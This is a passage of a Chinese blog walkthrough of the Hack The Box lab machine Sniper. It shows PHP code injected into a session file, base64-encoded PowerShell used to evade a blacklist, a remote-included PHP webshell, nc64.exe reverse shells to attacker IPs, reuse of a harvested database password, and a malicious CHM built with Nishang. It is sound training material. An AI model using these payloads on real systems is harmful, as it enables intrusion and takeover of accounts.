+<p>虽然能够成功注册，但是无法成功登陆<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.33.14.png" alt="截屏2022-03-08 下午3.33.14"><br>可能在后端代码中存在一些注入，尝试混淆语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami` <span class="meta">?&gt;</span>b</span><br></pre></td></tr></table></figure>
+<p>成功登陆后请求会话文件发现命令执行成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.35.48.png" alt="截屏2022-03-08 下午3.35.48"><br>尝试获取站点下的<code>user</code>目录文件来了解<code>registration.php</code>的过滤规则，网站默认路径为<code>\\inetpub\\wwwroot</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="meta">&lt;?php</span> <span class="keyword">echo</span> `dir \\inetpub\\wwwroot\\user` <span class="meta">?&gt;</span>b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.40.35.png" alt="截屏2022-03-08 下午3.40.35"><br>在读取<code>registration.php</code>时遇到了问题，<code>.</code>字符导致内容无法回显，使用<code>*</code>替代拿到该文件的源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="meta">&lt;?php</span> <span class="keyword">echo</span> `powershell cat \\inetpub\\wwwroot\\user\\registration*php` <span class="meta">?&gt;</span>b</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%883.52.45.png" alt="截屏2022-03-08 下午3.52.45"><br>黑名单中包含了字符<code>-$[(_.;&amp;&quot;\</code>，因此在命令中不能包含这些特殊字符，通过 base64 编码可以帮助我们绕过这些字符限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cmd /c &quot;\\10.10.14.7\mac\nc64.exe -e cmd 10.10.14.7 443&quot;&#x27;</span> | iconv -f ascii -t utf-16le | base64 -w0</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%884.04.17.png" alt="截屏2022-03-08 下午4.04.17"><br><code>/enc</code>会在执行命令时将 base64 解码，可注册为以下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAMQAwAC4AMQAwAC4AMQA0AC4ANwBcAG0AYQBjAAoAYwA2ADQALgBlAHgAZQAgAC0AZQAgAGMAbQBkACAAMQAwAC4AMQAwAC4AMQA0AC4ANwAgADQANAAzACIACgA=` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在本地监听443端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp 443</span><br></pre></td></tr></table></figure>
+<p>登陆成功后请求会话数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -G <span class="string">&#x27;http://10.10.10.151/blog/&#x27;</span> --data-urlencode <span class="string">&#x27;lang=\windows\temp\sess_8b23pbv8tj4m02qisnape584d8&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>但是并没有返回会话，甚至都没有请求 smb 服务，于是解码 base64 并与 0xdf 大神的编码进行对比<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%884.55.08.png" alt="截屏2022-03-08 下午4.55.08"><br>发现我的命令并不完整，原来是<code>\n</code>被转义了，需要重新编码</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgA3AFwAbQBhAGMAXABuAGMANgA0AC4AZQB4AGUAIAAtAGUAIABjAG0AZAAgADEAMAAuADEAMAAuADEANAAuADcAIAA0ADQAMwAiAAoA</span></span><br></pre></td></tr></table></figure>
+<p>验证通过<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-08%20%E4%B8%8B%E5%8D%885.28.53.png" alt="截屏2022-03-08 下午5.28.53"><br>再次在注册界面注册账户并请求会话数据</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;?php</span> <span class="string">echo</span> <span class="string">`powershell</span> <span class="string">/enc</span> <span class="string">YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgA3AFwAbQBhAGMAXABuAGMANgA0AC4AZQB4AGUAIAAtAGUAIABjAG0AZAAgADEAMAAuADEAMAAuADEANAAuADcAIAA0ADQAMwAiAAoA`</span> <span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%889.10.36.png" alt="截屏2022-03-10 上午9.10.36"><br>成功拿到反弹shell</p>
+<h3 id="远程文件包含上线"><a href="#远程文件包含上线" class="headerlink" title="远程文件包含上线"></a>远程文件包含上线</h3><p>除了通过本地文件包含，我们还可以利用远程文件包含，比如包含一个简单的PHP小马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以请求一个包含 cmd 的参数进行验证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -G <span class="string">&#x27;http://10.10.10.151/blog/&#x27;</span> --data-urlencode <span class="string">&#x27;lang=\\10.10.14.5\mac\cmd.php&#x27;</span> --data-urlencode <span class="string">&#x27;cmd=whoami&#x27;</span> | sed -n <span class="string">&#x27;/&lt;\/html&gt;/,/&lt;\/body&gt;/p&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%889.37.45.png" alt="截屏2022-03-10 上午9.37.45"><br>成功执行命令，因此我们可以通过该shell执行反弹shell命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -G <span class="string">&#x27;http://10.10.10.151/blog/&#x27;</span> --data-urlencode <span class="string">&#x27;lang=\\10.10.14.5\mac\cmd.php&#x27;</span> --data-urlencode <span class="string">&#x27;cmd=\\10.10.14.5\mac\nc64.exe -e cmd 10.10.14.5 4444&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在本地监听4444端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%889.51.33.png" alt="截屏2022-03-10 上午9.51.33"><br>成功反弹shell</p>
+<h2 id="0x03-权限提升-chris"><a href="#0x03-权限提升-chris" class="headerlink" title="0x03 权限提升[chris]"></a>0x03 权限提升[chris]</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在当前站点目录下发现数据库的认证信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\inetpub\wwwroot\user\db.php</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.04.33.png" alt="截屏2022-03-10 上午10.04.33"><br>其中密码为<code>36mEAhz/B8xQ~2VM</code>，与此同时发现用户<code>Chris</code>和管理员</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.09.49.png" alt="截屏2022-03-10 上午10.09.49"></p>
+<h3 id="获取凭据"><a href="#获取凭据" class="headerlink" title="获取凭据"></a>获取凭据</h3><p>有了账号密码就可以尝试通过 powershell 来运行他们的身份，首先查看主机名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">PS &gt; hostname</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.36.34.png" alt="截屏2022-03-10 上午10.36.34"><br>制作用户<code>Chris</code>的身份凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; <span class="variable">$user</span> = <span class="string">&quot;Sniper\Chris&quot;</span></span><br><span class="line">PS &gt; <span class="variable">$pass</span> = <span class="string">&quot;36mEAhz/B8xQ~2VM&quot;</span></span><br><span class="line">PS &gt; <span class="variable">$secstr</span> = New-Object -TypeName System.Security.SecureString</span><br><span class="line">PS &gt; <span class="variable">$pass</span>.ToCharArray() | ForEach-Object &#123;<span class="variable">$secstr</span>.AppendChar(<span class="variable">$_</span>)&#125;</span><br><span class="line">PS &gt; <span class="variable">$cred</span> = new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="variable">$user</span>, <span class="variable">$secstr</span></span><br><span class="line">PS &gt; Invoke-Command -ScriptBlock &#123; whoami &#125; -Credential <span class="variable">$cred</span> -Computer localhost</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.48.24.png" alt="截屏2022-03-10 上午10.48.24"><br>可以看到运行权限为<code>Chris</code>身份，查看用户<code>Chris</code>发现<code>Chris</code>属于远程管理用户组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user chris</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8810.54.46.png" alt="截屏2022-03-10 上午10.54.46"><br>在当前用户桌面上获取第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; Invoke-Command -ScriptBlock &#123; dir c:\Users\chris\Desktop &#125; -Credential <span class="variable">$cred</span> -Computer localhost</span><br><span class="line">PS &gt; Invoke-Command -ScriptBlock &#123; <span class="built_in">type</span> c:\Users\chris\Desktop\user.txt &#125; -Credential <span class="variable">$cred</span> -Computer localhost</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.00.56.png" alt="截屏2022-03-10 上午11.00.56"><br>成功拿到第一个flag</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>借助本地的 nc 可以完成反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; Invoke-Command -ScriptBlock &#123; \\10.10.14.5\mac\nc64.exe -e cmd 10.10.14.5 5555 &#125; -Credential <span class="variable">$cred</span> -Computer localhost</span><br></pre></td></tr></table></figure>
+<p>在本地监听5555端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp 5555</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.10.30.png" alt="截屏2022-03-10 上午11.10.30"><br>成功拿到反弹shell</p>
+<h2 id="0x04-权限提升-administrator"><a href="#0x04-权限提升-administrator" class="headerlink" title="0x04 权限提升[administrator]"></a>0x04 权限提升[administrator]</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>在<code>C:\Docs</code>目录下存在几个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Docs</span><br><span class="line">dir</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.12.40.png" alt="截屏2022-03-10 上午11.12.40"><br>查看<code>note.txt</code>，其中 CEO 要求 Chris 删除文档</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> note.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.13.35.png" alt="截屏2022-03-10 上午11.13.35"><br>在当前用户的<code>Downloads</code>目录下存在<code>instructions.chm</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\Users\Chris\Downloads\</span><br><span class="line">dir c:\Users\Chris\Downloads\</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8A%E5%8D%8811.15.56.png" alt="截屏2022-03-10 上午11.15.56"><br><code>.chm</code>是 Windows 帮助文件，因此可能是 CEO 正在讨论的文档，将其复制到本地进行检查</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy instructions.chm \\10.10.14.5\mac\instructions.chm</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2018-03-10%20%E4%B8%8A%E5%8D%8811.35.53.png" alt="截屏2018-03-10 上午11.35.53"></p>
+<h3 id="恶意chm"><a href="#恶意chm" class="headerlink" title="恶意chm"></a>恶意chm</h3><p>Nishang 中的 Out-CHM.ps1 可以帮助我们在<code>.chm</code>文件中加载 payload 运行，首先在 Windows 中导入该文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Out-CHM.ps1</span><br></pre></td></tr></table></figure>
+<p>调用<code>Out-CHM</code>传递<code>HTML Help Workshop</code>路径并加载 payloadc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-CHM -Payload <span class="string">&quot;\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.5 6666&quot;</span> -HHCPath <span class="string">&quot;C:\Program Files (x86)\HTML Help Workshop&quot;</span></span><br></pre></td></tr></table></figure>
+<p>在执行之前需要先安装<code>HTML Help Workshop</code>，否则会出现报错<br><strong>下载地址：<a target="_blank" rel="noopener" href="https://www.helpandmanual.com/downloads_mscomp.html">https://www.helpandmanual.com/downloads_mscomp.html</a></strong><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.24.10.png" alt="截屏2022-03-10 下午2.24.10"><br>成功生成<code>doc.chm</code></p>
+<h3 id="管理员上线"><a href="#管理员上线" class="headerlink" title="管理员上线"></a>管理员上线</h3><p>将<code>doc.chm</code>和<code>nc64.exe</code>复制到靶机当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.14.5\mac\doc.chm .</span><br><span class="line">copy \\10.10.14.5\mac\nc64.exe \windows\system32\spool\drivers\color\nc64.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.38.40.png" alt="截屏2022-03-10 下午2.38.40"></p>
+<p>同时开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp 6666</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.52.02.png" alt="截屏2022-03-10 下午2.52.02"></p>
+<p>成功拿到管理员权限，在管理员桌面哈桑寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/8461de82/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.56.26.png" alt="截屏2022-03-10 下午2.56.26"></p>
+<p>成功拿到第二个flag</p>
+<p><strong>总结：站点中存在两个重要的目录，分别为user和blog，blog目录在语言切换中使用?lang=xx.php，这很大程度上说明可能存在文件包含漏洞；user目录则用于用户注册和登陆账号，在之后的会话利用也帮助我们拿到了sessionid，从而确认了session地址。文件包含漏洞验证成功后我们发现存在两种上线方式，一是本地文件包含利用，即通过包含session位置中注册用户名（PHP代码）来达到代码执行的效果；二是相对简单的远程文件包含利用，即只要在本地放置木马文件请求包含就可获取权限。上线靶机后在其中找到数据库配置文件，里面存在密码，利用用户名和密码通过powershell制作凭证上线chris用户。最后使用nishang脚本Out-CHM生成恶意chm文件拿到管理员用户权限。</strong></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/fea7275/">HTB: Json<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
